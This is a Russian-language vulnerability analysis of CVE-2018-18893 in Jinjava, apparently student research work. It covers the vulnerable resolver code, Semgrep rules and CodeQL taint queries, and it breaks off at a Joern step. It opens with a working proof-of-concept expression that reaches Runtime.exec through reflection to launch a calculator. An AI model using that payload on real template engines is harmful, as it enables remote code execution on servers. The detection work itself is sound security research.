**CVE-2018-18893 (Маджуга Богдан Андреевич)**

**Описание:**

Выполняем данный код используя **Jinjava** версия <= 2.4.5

```
Jinjava jinjava = new Jinjava();
JinjavaInterpreter interpreter = jinjava.newInterpreter(); 
Context context = interpreter.getContext(); context.put("obj",""); 
String poc ="''.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",''.getClass()).invoke(''.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),'/usr/bin/gnome-calculator')"; 
Object a = interpreter.resolveELExpression(poc, -1);
```

После запуска - на Linux машине запускается приложение калькулятор. 

Данная уязвимость отсылается к типу **Expression Resolver** уязвимостям и вообще говоря, для нее не предусмотрен конкретный набор методов, вызывающих ее. В процессе анализа уязвимости и кода, было замечено, что исходная строка конвертируется в метод, который вызывается системой. Следовательно необходимо было искать объекты абстрактного Java класса `Method` и вызов у них методов под названием `invoke()`

Первичным осмотром, искомый код нашелся в классе **BeanELResolver**, где нас интересует следующий код:

```
  @Override
  public Object invoke(
    ELContext context,
    Object base,
    Object method,
    Class<?>[] paramTypes,
    Object[] params
  ) {
    if (context == null) {
      throw new NullPointerException();
    }
    Object result = null;
    if (isResolvable(base)) {
      if (params == null) {
        params = new Object[0];
      }
      String name = method.toString();
      Method target = findMethod(base, name, paramTypes, params, params.length);
      if (target == null) {
        throw new MethodNotFoundException(
          "Cannot find method " +
          name +
          " with " +
          params.length +
          " parameters in " +
          base.getClass()
        );
      }
      try {
        result =
          target.invoke(
            base,
            coerceParams(getExpressionFactory(context), target, params)
          );
      } catch (InvocationTargetException e) {
        throw new ELException(e.getCause());
      } catch (IllegalAccessException e) {
        throw new ELException(e);
      }
      context.setPropertyResolved(true);
    }
    return result;
  }
```
```
  protected Method findMethod(
    Object base,
    String name,
    Class<?>[] types,
    Object[] params,
    int paramCount
  ) {
    if (types != null) {
      try {
        return findAccessibleMethod(base.getClass().getMethod(name, types));
      } catch (NoSuchMethodException e) {
        return null;
      }
    }
    Method varArgsMethod = null;
    for (Method method : base.getClass().getMethods()) {
      if (method.getName().equals(name)) {
        int formalParamCount = method.getParameterTypes().length;
        if (method.isVarArgs() && paramCount >= formalParamCount - 1) {
          varArgsMethod = method;
        } else if (paramCount == formalParamCount) {
          return findAccessibleMethod(method);
        }
      }
    }
    return varArgsMethod == null ? null : findAccessibleMethod(varArgsMethod);
  }
```

**Semgrep**

Для начала, запустим стандартный набор правил `semgrep ci` и посмотрим, что нам выдаст общий анализ. Входе анализа была выявленна ровно одна уязвимость с использованием данного правила:

```
rules:
  - id: el-injection
    metadata:
      cwe:
        - "CWE-94: Improper Control of Generation of Code ('Code Injection')"
      owasp:
        - A03:2021 - Injection
      source-rule-url: https://find-sec-bugs.github.io/bugs.htm#EL_INJECTION
      category: security
      technology:
        - java
      references:
        - https://owasp.org/Top10/A03_2021-Injection
      cwe2022-top25: true
      subcategory:
        - audit
      likelihood: LOW
      impact: HIGH
      confidence: LOW
      license: Commons Clause License Condition v1.0[LGPL-2.1-only]
      vulnerability_class:
        - Code Injection
    message: An expression is built with a dynamic value. The source of the value(s)
      should be verified to avoid that unfiltered values fall into this risky
      code evaluation.
    severity: WARNING
    languages:
      - java
    patterns:
      - pattern-either:
          - pattern: |
              class $CLASS {
                ...
                ExpressionFactory $EF;
                ...
                $X $METHOD(...) {
                  ...
                  $EF.createValueExpression($CTX,$INPUT,...);
                  ...
                }
                ...
              }
          - pattern: |
              class $CLASS {
                ...
                ExpressionFactory $EF = ...;
                ...
                $X $METHOD(...) {
                  ...
                  $EF.createValueExpression($CTX,$INPUT,...);
                  ...
                }
                ...
              }
          - pattern: |
              $X $METHOD(...) {
                ...
                ExpressionFactory $EF = ...;
                ...
                $EF.createValueExpression($CTX,$INPUT,...);
                ...
              }
          - pattern: |
              $X $METHOD(...,ExpressionFactory $EF,...) {
                ...
                $EF.createValueExpression($CTX,$INPUT,...);
                ...
              }
          - pattern: |
              class $CLASS {
                ...
                ExpressionFactory $EF;
                ...
                $X $METHOD(...) {
                  ...
                  $EF.createMethodExpression($CTX,$INPUT,...);
                  ...
                }
                ...
              }
          - pattern: |
              class $CLASS {
                ...
                ExpressionFactory $EF = ...;
                ...
                $X $METHOD(...) {
                  ...
                  $EF.createMethodExpression($CTX,$INPUT,...);
                  ...
                }
                ...
              }
          - pattern: |
              $X $METHOD(...) {
                ...
                ExpressionFactory $EF = ...;
                ...
                $EF.createMethodExpression($CTX,$INPUT,...);
                ...
              }
          - pattern: |
              $X $METHOD(...,ExpressionFactory $EF,...) {
                ...
                $EF.createMethodExpression($CTX,$INPUT,...);
                ...
              }
          - pattern: |
              $X $METHOD(String $INPUT, ...) {
                ...
                $OBJECT.buildConstraintViolationWithTemplate($INPUT, ...);
                ...
              }
      - pattern-not: |
          $X $METHOD(...) {
            ...
            $EF.createValueExpression($CTX,"...",...);
            ...
          }
      - pattern-not: |
          $X $METHOD(...) {
            ...
            String $S = "...";
            ...
            $EF.createValueExpression($CTX,$S,...);
            ...
          }
      - pattern-not: |
          $X $METHOD(...) {
            ...
            $EF.createMethodExpression($CTX,"...",...);
            ...
          }
      - pattern-not: |
          $X $METHOD(...) {
            ...
            String $S = "...";
            ...
            $EF.createMethodExpression($CTX,$S,...);
            ...
          }
```

Описание уязвимости:
**Уязвимость:** el-injection
**Класс:** ExpressionResolver 

Данная уязвимость непосредственно связанна с искомой, но находит она её на слишком высоком уровне. Соотвественно было написанно новое правило, для поиска строчки - приводящей к уязвимости:

```
rules:
  - id: find-method-invoke
    languages:
      - java
    patterns:
      - pattern: (java.lang.reflect.Method $METHOD).invoke(...);
    message: "Found method invocation: {{source}}"
    severity: WARNING
```

Стоит отметить, что данное правило достаточно абстрактное, но оно находит проблемное место в коде.



**CodeQL**

Найдя проблемное место с помощью *Semgrep* и подтвердив наличие искомой **ELResolver** уязвимости, попробуем найти проблемный путь для анализа, используя *CodeQL*. Конечно точкой будем искать `(java.lang.reflect.Method method).invoke()`, в качестве начальной точки любой публичный метод со строкой на вход. Соответсвенно для этого используются следующие два скрипта:

Поиск конечной точки:

```
import java

from MethodAccess ma, RefType methodType
where
  methodType.hasQualifiedName("java.lang.reflect", "Method") and
  ma.getMethod().getName() = "invoke" and
  ma.getQualifier().getType() = methodType
select ma, ma.getFile().getRelativePath(), "This method access calls invoke on a Method object in this file."
```

Поиск начальной точки:

```
import java

// Выборка методов
from Method m, Parameter p
where
  m.isPublic() and               // Фильтрация публичных методов
  p.getType() instanceof TypeString and  // Параметр типа String
  p.getCallable() = m   // Параметр принадлежит методу m
select m, m.getFile().getRelativePath(), "This public method takes a string parameter."
```

Данные скрипты находят искомые ноды. Вот этот метод из примера с воспроизведением уязвимости: `Object a = interpreter.resolveELExpression(poc, -1);` и `target.invoke(base,coerceParams(getExpressionFactory(context), target, params));`. 

Для того, чтобы построить путь, используется следующий скрипт:

```
/**
 * @kind path-problem
 */

 import java
 import semmle.code.java.dataflow.DataFlow
 import semmle.code.java.dataflow.TaintTracking 
 
// Определение источника данных
class Source extends DataFlow::Node {
    Source() {
      exists(Method m, Parameter p |
        this.asParameter() = p and
        p.getType() instanceof TypeString and
        p.getCallable() = m and
        m.isPublic()
      )
    }
  }
  
  // Определение приемника данных
  class Sink extends DataFlow::Node {
    Sink() {
      exists(MethodAccess ma, RefType methodType |
        methodType.hasQualifiedName("java.lang.reflect", "Method") and
        ma.getMethod().getName() = "invoke" and
        ma.getQualifier().getType() = methodType and
        this.asExpr() = ma
      )
    }
  }
 
 module MyFlowConfig implements DataFlow::ConfigSig {
     predicate isSource(DataFlow::Node source) {
         source instanceof Source
     }
 
     predicate isSink(DataFlow::Node sink) {
         sink instanceof Sink
     }
 }
 
 module MyFlow = TaintTracking::Global<MyFlowConfig>;
 import MyFlow::PathGraph
 
 from MyFlow::PathNode source, MyFlow::PathNode sink
 where MyFlow::flowPath(source, sink)
 select sink.getNode(), source, sink,
     "Source: " + source.getNode().asParameter().getCallable().getDeclaringType() + "." + source.getNode().asParameter().getCallable()
```

К сожалению данный скрипт не может найти ни одного пути, по неизвестной причине. Возможно проблема с поломанной базой данных. Но я пробовал собрать собственную базу данных, и путь все равно не строился. При этом, если поставить Breakpoint в IDE, то скрипт действительно доходит до данной строчки и вызывает на ней все описанные в строке команды. 

**Joern**
importCode(inputPath="./jinjava", projectName="jinjava")
